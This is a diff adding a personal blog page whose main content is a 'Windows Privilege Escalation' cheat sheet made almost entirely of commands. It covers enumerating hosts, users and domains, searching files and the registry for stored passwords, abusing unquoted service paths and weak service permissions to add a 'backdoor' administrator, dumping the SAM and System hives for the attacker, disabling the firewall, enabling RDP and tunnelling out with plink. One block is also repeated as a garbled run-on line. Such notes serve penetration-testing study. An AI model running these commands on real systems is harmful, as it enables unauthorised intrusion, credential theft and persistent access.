@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KageHayashi" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      Windows Privilege Escalation 
+      
+      
+      |
+    
+     KageHayashi
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/t-apple-touch-icon.png">
+    <link rel="icon" href="/images/takeda_white_small.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Nunito&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Rubik&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Kanit&display=swap" rel="stylesheet">
+
+<div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img id="author_photo" src="/images/light.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">KageHayashi</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/cheatsheets/">
+          <a href="/cheatsheets/">Cheat Sheets</a>
+        </li>
+      
+        <li class="nav-item" data-path="/shells/">
+          <a href="/shells/">Shells</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Windows Privilege Escalation</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-03-05 20:30:18
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h2 id="Host-Info"><a href="#Host-Info" class="headerlink" title="Host Info"></a>Host Info</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ver</span><br><span class="line">systeminfo</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">tasklist /v</span><br><span class="line">c:\windows\system32\license.rtf</span><br><span class="line">c:\windows\system32\eula.txt</span><br><span class="line">wmic os get Caption, CSDVersion /value</span><br></pre></td></tr></table></figure>
+
+<h2 id="User-Info"><a href="#User-Info" class="headerlink" title="User Info"></a>User Info</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">echo %username%</span><br><span class="line">net user</span><br><span class="line">net user (username)</span><br><span class="line">echo %userprofile%</span><br><span class="line">net localgroup</span><br><span class="line">net config Workstation | find &quot;User name&quot;</span><br><span class="line">query user</span><br><span class="line">wmic useraccount get name</span><br><span class="line">wmic /node: &quot;127.0.0.1&quot; computersystem get username</span><br><span class="line">qwinsta</span><br><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
+
+<h2 id="Environment-Info"><a href="#Environment-Info" class="headerlink" title="Environment Info"></a>Environment Info</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set</span><br><span class="line">net</span><br></pre></td></tr></table></figure>
+
+<h2 id="Domain-Info"><a href="#Domain-Info" class="headerlink" title="Domain Info"></a>Domain Info</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br><span class="line">net view /domain:THINC</span><br><span class="line">net localgroup “Administrators”</span><br><span class="line">net group &quot;Domain Admins&quot; /domain </span><br><span class="line">net share </span><br><span class="line">net session | find / &quot;\\&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Network-Info"><a href="#Network-Info" class="headerlink" title="Network Info"></a>Network Info</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line">route print</span><br><span class="line">arp -A</span><br><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+<h2 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">echo %username%</span><br><span class="line">net user</span><br><span class="line">net user (username)</span><br><span class="line">echo %userprofile%</span><br><span class="line">net localgroup</span><br><span class="line">net config Workstation | find &quot;User name&quot;</span><br><span class="line">query user</span><br><span class="line">wmic useraccount get name</span><br><span class="line">wmic /node: &quot;127.0.0.1&quot; computersystem get username</span><br><span class="line">qwinsta</span><br><span class="line">reg.exe query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v DefaultUserName</span><br><span class="line">reg.exe query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v DefaultPassword</span><br></pre></td></tr></table></figure>
+
+<h2 id="Password-Enumeration"><a href="#Password-Enumeration" class="headerlink" title="Password Enumeration"></a>Password Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">Simple File Search: </span><br><span class="line">dir /s *password*  </span><br><span class="line">findstr /s /n /i /p password *  </span><br><span class="line">findstr /si password *.txt</span><br><span class="line">dir /s *secret*  </span><br><span class="line">findstr /s /n /i /p secret *  </span><br><span class="line">findstr /si secret *.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query</span><br><span class="line">schtasks /query /v /fo LIST</span><br><span class="line">Get-ScheduledTask | Where State -EQ &#x27;Ready&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Patch-Levels-KE"><a href="#Patch-Levels-KE" class="headerlink" title="Patch Levels (KE)"></a>Patch Levels (KE)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">systeminfo </span><br><span class="line"></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line">Notes</span><br><span class="line">Look for privilege escalation exploits and look up their respective KB patch numbers. Such exploits include, but are not limited to, KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11- 080 (KB2592799)</span><br><span class="line">After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers you can grep the installed patches to see if any are missing</span><br><span class="line">Search patches for given patch</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Writable-Files"><a href="#Writable-Files" class="headerlink" title="Writable Files"></a>Writable Files</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dir /a-r-d /s /b</span><br><span class="line"></span><br><span class="line">Notes</span><br><span class="line"></span><br><span class="line">/a is to search for attributes. In this case r is read only and d is directory. The minus signs negate those attributes. So we&#x27;re looking for writable files only.</span><br><span class="line"></span><br><span class="line">/s means recurse subdirectories</span><br><span class="line">/b means bare format. Path and filename only.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Unquoted-Service-Paths"><a href="#Unquoted-Service-Paths" class="headerlink" title="Unquoted Service Paths"></a>Unquoted Service Paths</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">List all unquoted service paths (minus built-in Windows services) on our compromised machine:</span><br><span class="line"></span><br><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">Suppose we found:</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe</span><br><span class="line"></span><br><span class="line">If you look at the registry entry for this service with Regedit you can see the ImagePath value is:</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe</span><br><span class="line"></span><br><span class="line">To be secure it should be like this:</span><br><span class="line"> “C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe”</span><br><span class="line">When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find:</span><br><span class="line">   C:\Program.exe</span><br><span class="line">   C:\Program Files.exe</span><br><span class="line">   C:\Program Files(x86)\Program Folder\A.exe</span><br><span class="line">       …</span><br><span class="line">Check permissions of folder path</span><br><span class="line">   icacls &quot;C:\Program Files (x86)\Program Folder&quot;</span><br><span class="line"></span><br><span class="line">If we can write in the path we plant a backdoor with the same name with the service and restart the service.</span><br><span class="line"></span><br><span class="line">Metasploit module:</span><br><span class="line"></span><br><span class="line">exploit/windows/local/trusted_service_path</span><br></pre></td></tr></table></figure>
+
+<h2 id="Weak-Service-Permissions"><a href="#Weak-Service-Permissions" class="headerlink" title="Weak Service Permissions"></a>Weak Service Permissions</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe</span><br><span class="line"></span><br><span class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula</span><br><span class="line">accesschk.exe -qdws &quot;Authenticated Users&quot; C:\Windows\ /accepteula</span><br><span class="line">accesschk.exe -qdws Users C:\Windows\</span><br><span class="line">Then query the service using Windows sc: </span><br><span class="line">sc qc &lt;vulnerable service name&gt;</span><br><span class="line"></span><br><span class="line">Then change the binpath to execute your own commands (restart of the service will most likely be needed): </span><br><span class="line"></span><br><span class="line">sc config &lt;vuln-service&gt; binpath= &quot;net user backdoor backdoor123 /add&quot; </span><br><span class="line">sc stop &lt;vuln-service&gt;</span><br><span class="line">sc start &lt;vuln-service&gt;</span><br><span class="line">sc config &lt;vuln-service&gt; binpath= &quot;net localgroup Administrators backdoor /add&quot; </span><br><span class="line">sc stop &lt;vuln-service&gt;</span><br><span class="line">sc start &lt;vuln-service&gt;</span><br><span class="line">Note - Might need to use the depend attribute explicitly: </span><br><span class="line">sc stop &lt;vuln-service&gt;</span><br><span class="line">sc config &lt;vuln-service&gt; binPath= &quot;c:\inetpub\wwwroot\runmsf.exe&quot; depend= &quot;&quot; start= demand obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</span><br><span class="line">sc start &lt;vuln-service&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Metasploit module: </span><br><span class="line">exploit/windows/local/service_permissions</span><br><span class="line">&lt;a href=&quot;https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exeaccesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteulaaccesschk.exe -qdws &quot;Authenticated Users&quot; C:\Windows\ /accepteulaaccesschk.exe -qdws Users C:\Windows\Then query the service using Windows sc: sc qc &lt;vulnerable service name&gt;Then change the binpath to execute your own commands (restart of the service will most likely be needed): sc config &lt;vuln-service&gt; binpath= &quot;net user backdoor backdoor123 /add&quot; sc stop &lt;vuln-service&gt;sc start &lt;vuln-service&gt;sc config &lt;vuln-service&gt; binpath= &quot;net localgroup Administrators backdoor /add&quot; sc stop &lt;vuln-service&gt;sc start &lt;vuln-service&gt;Note - Might need to use the depend attribute explicitly: sc stop &lt;vuln-service&gt;sc config &lt;vuln-service&gt; binPath= &quot;c:\inetpub\wwwroot\runmsf.exe&quot; depend= &quot;&quot; start= demand obj= &quot;.\LocalSystem&quot; password= &quot;&quot;sc start </span><br></pre></td></tr></table></figure>
+
+<h2 id="SAM-Dumping"><a href="#SAM-Dumping" class="headerlink" title="SAM Dumping"></a>SAM Dumping</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SAM c:\SAM</span><br><span class="line">reg save HKLM\System c:\System</span><br><span class="line"></span><br><span class="line"><span class="comment"># Transfer SAM and System to attacker then:</span></span><br><span class="line"></span><br><span class="line">samdump2 System SAM </span><br></pre></td></tr></table></figure>
+
+<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><ul>
+<li><p>Add Users</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user username password /add</span><br><span class="line">net localgroup Administrators username /add</span><br><span class="line">net localgroup “Remote Desktop Users” username /add</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>psexec.exe -accepteula \\10.11.10.167 -u hostname\username -p password cmd /c ipconfig </code></p>
+</li>
+<li><p>RunAs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /user:hostname\&lt;username&gt; explorer.exe</span><br></pre></td></tr></table></figure></li>
+<li><p>Disable Firewall<br>Remember, windows firewall is implicit block all incoming and implicit allow all outgoing</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall show config</span><br><span class="line">netsh advfirewall firewall show rule all</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>RDP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Enable RDP</span><br><span class="line">reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line"># Old RDP ker cred login bullshit</span><br><span class="line">reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v UserAuthentication /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line"># Local Remote port forward Plink (Use to tunnel out RDP, SMB, etc. etc.)</span><br><span class="line">    plink.exe -l &lt;user&gt; -pw &lt;password&gt; 10.11.0.70 -R 9595:localhost:445</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>AV Evasion</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">veil-evasion</span><br><span class="line">hyperion.exe</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="Extra"><a href="#Extra" class="headerlink" title="Extra"></a>Extra</h2><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a> </p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-03-05 20:30:18
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Host-Info"><span class="toc-text">Host Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Info"><span class="toc-text">User Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-Info"><span class="toc-text">Environment Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Info"><span class="toc-text">Domain Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Info"><span class="toc-text">Network Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Enumeration"><span class="toc-text">User Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Enumeration"><span class="toc-text">Password Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scheduled-Tasks"><span class="toc-text">Scheduled Tasks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch-Levels-KE"><span class="toc-text">Patch Levels (KE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writable-Files"><span class="toc-text">Writable Files</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unquoted-Service-Paths"><span class="toc-text">Unquoted Service Paths</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weak-Service-Permissions"><span class="toc-text">Weak Service Permissions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SAM-Dumping"><span class="toc-text">SAM Dumping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-text">Post Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extra"><span class="toc-text">Extra</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/kagehayashi">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/kagehayashi">Copyright © 2024 KageHayashi</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        ▰▰▰
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Windows%20Privilege%20Escalation + '&url=' + https%3A%2F%2Fkagehayashi.com%2Fwindows-priv-esc%2Findex.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://kagehayashi.com/windows-priv-esc/index.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
